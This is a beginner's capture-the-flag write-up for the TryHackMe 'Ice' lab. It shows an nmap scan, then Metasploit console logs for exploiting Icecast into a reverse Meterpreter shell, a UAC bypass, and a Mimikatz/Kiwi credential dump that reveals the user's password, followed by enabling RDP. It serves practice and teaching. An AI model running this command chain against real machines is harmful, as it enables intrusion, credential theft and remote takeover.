# write up for the 'ice' on try hack me 
> This room focuses on exploiting and testing penetration skills on machine based on various exploits,vulnerblities and skills.
> ## Recon
> firstly, i scanned through all the orts using nmap ` sudo nmap -sS -p- <ip-addess> `,and found various inteesting stuff
> ![1](https://github.com/user-attachments/assets/6e0520b2-76e9-40f5-8221-1b53ffbbce5c)
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 07:48 EDT
Warning: 10.10.109.243 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.109.243
Host is up (0.16s latency).
Not shown: 65515 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open     ms-wbt-server Microsoft Terminal Service
5357/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open     http          Icecast streaming media server
14298/tcp filtered unknown
17467/tcp filtered unknown
20835/tcp filtered unknown
21195/tcp filtered unknown
39711/tcp filtered unknown
49152/tcp open     msrpc         Microsoft Windows RPC
49153/tcp open     msrpc         Microsoft Windows RPC
49154/tcp open     msrpc         Microsoft Windows RPC
49158/tcp open     msrpc         Microsoft Windows RPC
49159/tcp open     msrpc         Microsoft Windows RPC
49160/tcp open     msrpc         Microsoft Windows RPC
50601/tcp filtered unknown
55110/tcp filtered unknown
60455/tcp filtered unknown
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 612.13 seconds
```
by usiing -s
## Gain Access
>During service enumeration, we identified Icecast running on the target machine — a known vulnerable media streaming server. Researching the vulnerability (CVE-2004-1561) on cvedetails.com revealed an Impact Score of 6.4, indicating significant potential damage. Using Metasploit, we searched for available exploits with search icecast and found the relevant module: exploit/windows/http/icecast_header. After selecting the module and configuring RHOSTS with the target IP and LHOST with our tun0 IP, we executed the exploit with the exploit command. This gave us a Meterpreter session, successfully compromising the machine and setting the stage for post-exploitation activities.
```Metasploit tip: Set the current module's RHOSTS with database values using 
hosts -R or services -R
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.4.69-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]
+ -- --=[ 1672 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/icecast_header) > options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.14     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/icecast_header) > Interrupt: use the 'exit' command to quit
msf6 exploit(windows/http/icecast_header) > Set RHOSTS 10.10.42.117
[-] Unknown command: Set. Did you mean set? Run the help command for more details.
msf6 exploit(windows/http/icecast_header) > set RHOSTS 10.10.42.117
RHOSTS => 10.10.42.117
msf6 exploit(windows/http/icecast_header) > set Lhost 10.17.33.144
Lhost => 10.17.33.144
msf6 exploit(windows/http/icecast_header) > exploit
[*] Started reverse TCP handler on 10.17.33.144:4444 
[*] Sending stage (177734 bytes) to 10.10.42.117
[*] Meterpreter session 1 opened (10.17.33.144:4444 -> 10.10.42.117:49180) at 2025-06-22 03:06:49 -0400

```
![2](https://github.com/user-attachments/assets/e0cd2ea4-6ddd-43ba-aa39-d1b12da955db)
## Escalate
>We exploited the vulnerable Icecast service and gained a Meterpreter shell on the target machine. Initial recon showed the user as Dark, running Windows build 7601 with x64 architecture. Using local_exploit_suggester, we found exploit/windows/local/bypassuac_eventvwr as a privilege escalation path. After setting the correct SESSION and LHOST, we ran the exploit and received a new elevated session. Running getprivs confirmed elevated permissions, including SeTakeOwnershipPrivilege, allowing file ownership takeover — indicating successful privilege escalation.
```
meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```
## Looting
>With elevated privileges, we aimed to interact with lsass, the Windows authentication service. We first listed processes using ps and identified the spoolsv.exe (Printer Spooler) process as a suitable migration target due to its matching architecture (x64) and permissions. Using migrate -N spoolsv.exe, we migrated successfully and confirmed SYSTEM-level access via getuid. Next, we loaded Kiwi (load kiwi)—an updated version of Mimikatz—and used the creds_all command to dump credentials. From this, we extracted the password for user Dark, leveraging the weak security posture of the target system
```
sessions -i 1
[*] Starting interaction with 1...

meterpreter > run post/multi/recon/local_exploit_suggester
[*] 10.10.42.117 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/modules/exploits/linux/local/sock_sendpage.rb:47: warning: key "Notes" is duplicated and overwritten on line 68
/usr/share/metasploit-framework/modules/exploits/unix/webapp/phpbb_highlight.rb:46: warning: key "Notes" is duplicated and overwritten on line 51
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.10.42.117 - 205 exploit checks are being tried...
[+] 10.10.42.117 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.42.117 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.42.117 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.42.117 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.42.117 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.42.117 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.42.117 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.42.117 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.42.117 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.42.117 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[+] 10.10.42.117 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.42.117 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                                                                  
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 13  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 14  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 15  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 16  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 17  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 18  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 19  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 20  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 21  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 22  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 23  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 24  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 25  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 26  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 27  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
 28  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 29  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
 30  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 31  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
 32  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
 33  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The target is not exploitable.
 34  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
 35  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 36  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 37  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 38  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 39  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 40  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 41  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 42  exploit/windows/local/webexec                                  No                       The check raised an exception.

meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/icecast_header) > use Sure! Here's a shorter and more presentable version of the write-up:
[-] Parse error: Unmatched quote: "use Sure! Here's a shorter and more presentable version of the write-up:"
msf6 exploit(windows/http/icecast_header) > 
msf6 exploit(windows/http/icecast_header) > We exploited the vulnerable Icecast service and gained a Meterpreter shell on the target machine. Initial recon showed the user as Dark, running Windows build 7601 with x64 architecture. Using local_exploit_suggester, we found exploit/windows/local/bypassuac_eventvwr as a privilege escalation path. After setting the correct SESSION and LHOST, we ran the exploit and received a new elevated session. Running getprivs confirmed elevated permissions, including SeTakeOwnershipPrivilege, allowing file ownership takeover — indicating successful privilege escalation.Interrupt: use the 'exit' command to quit
msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_eventvwr) > show options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.14     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_eventvwr) > set lhost 10.17.33.144
lhost => 10.17.33.144
msf6 exploit(windows/local/bypassuac_eventvwr) > run
[*] Started reverse TCP handler on 10.17.33.144:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (177734 bytes) to 10.10.42.117
[*] Meterpreter session 2 opened (10.17.33.144:4444 -> 10.10.42.117:49230) at 2025-06-22 03:46:04 -0400
[*] Cleaning up registry keys ...

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```
## Post Exploitation
>In our post-exploitation phase, we explored various powerful Meterpreter commands. We used hashdump to extract password hashes and screenshare to watch the remote desktop in real time. To capture audio, we used record_mic, and for timestamp manipulation (if explicitly allowed), timestomp. Leveraging Mimikatz, we prepared for persistence with golden_ticket_create, which abuses Kerberos authentication. Finally, with the credentials for user Dark, we enabled RDP using run post/windows/manage/enable_rdp to allow graphical access to the target system — gaining full insight into the user's environment.
```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 460   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 584   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 996   692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1052  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1132  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1264  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1316  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1428  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1436  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
 1508  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1556  460   dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
 1576  1540  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
 1628  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 1780  1576  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 1860  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1884  2680  powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
 1896  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2244  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2400  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2764  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2824  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 3052  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe

meterpreter > migrate -n spoolsv.exe
[-] Not a PID: -n
meterpreter > migrate -n 1264
[-] Not a PID: -n
meterpreter > migrate -N 1264
[-] Could not find process name 1264
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 1884 to 1264...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    show_mount                List all mount points/logical drives
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    getproxy                  Display the current proxy configuration
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    netstat                   Display the network connections
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target
    route                     View and modify the routing table


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    clearev                   Clear the event log
    drop_token                Relinquishes any active impersonation token.
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getprivs                  Attempt to enable all privileges available to the current process
    getsid                    Get the SID of the user that the server is running as
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    reboot                    Reboots the remote computer
    reg                       Modify and interact with the remote registry
    rev2self                  Calls RevertToSelf() on the remote machine
    shell                     Drop into a system command shell
    shutdown                  Shuts down the remote computer
    steal_token               Attempts to steal an impersonation token from the target process
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command                   Description
    -------                   -----------
    enumdesktops              List all accessible desktops and window stations
    getdesktop                Get the current meterpreter desktop
    idletime                  Returns the number of seconds the remote user has been idle
    keyboard_send             Send keystrokes
    keyevent                  Send key events
    keyscan_dump              Dump the keystroke buffer
    keyscan_start             Start capturing keystrokes
    keyscan_stop              Stop capturing keystrokes
    mouse                     Send mouse events
    screenshare               Watch the remote user desktop in real time
    screenshot                Grab a screenshot of the interactive desktop
    setdesktop                Change the meterpreters current desktop
    uictl                     Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    record_mic                Record audio from the default microphone for X seconds
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specified webcam
    webcam_stream             Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command                   Description
    -------                   -----------
    getsystem                 Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command                   Description
    -------                   -----------
    hashdump                  Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command                   Description
    -------                   -----------
    timestomp                 Manipulate file MACE attributes


Kiwi Commands
=============

    Command                   Description
    -------                   -----------
    creds_all                 Retrieve all credentials (parsed)
    creds_kerberos            Retrieve Kerberos creds (parsed)
    creds_livessp             Retrieve Live SSP creds
    creds_msv                 Retrieve LM/NTLM creds (parsed)
    creds_ssp                 Retrieve SSP creds
    creds_tspkg               Retrieve TsPkg creds (parsed)
    creds_wdigest             Retrieve WDigest creds (parsed)
    dcsync                    Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm               Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create      Create a golden kerberos ticket
    kerberos_ticket_list      List all kerberos tickets (unparsed)
    kerberos_ticket_purge     Purge any in-use kerberos tickets
    kerberos_ticket_use       Use a kerberos ticket
    kiwi_cmd                  Execute an arbitrary mimikatz command (unparsed)
    lsa_dump_sam              Dump LSA SAM (unparsed)
    lsa_dump_secrets          Dump LSA secrets (unparsed)
    password_change           Change the password/hash of a user
    wifi_list                 List wifi profiles/creds for the current user
    wifi_list_shared          List shared wifi profiles/creds (requires SYSTEM)

For more info on a specific command, use <command> -h or help <command>.

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)


meterpreter > run post/windows/manage/enable_rdp
[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20250622040940_default_10.10.42.117_host.windows.cle_937329.txt
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a0a:2a75
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 13
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:99:b2:d2:b6:59
MTU          : 9001
IPv4 Address : 10.10.42.117
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::6801:30e0:f4aa:4f83
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > 
```
## conclusion 
This room helped in practicing and harnessing recon and exploitation skill with nmap,metasploit,mimikatz and it was a easy challenge for me as a beginner. 
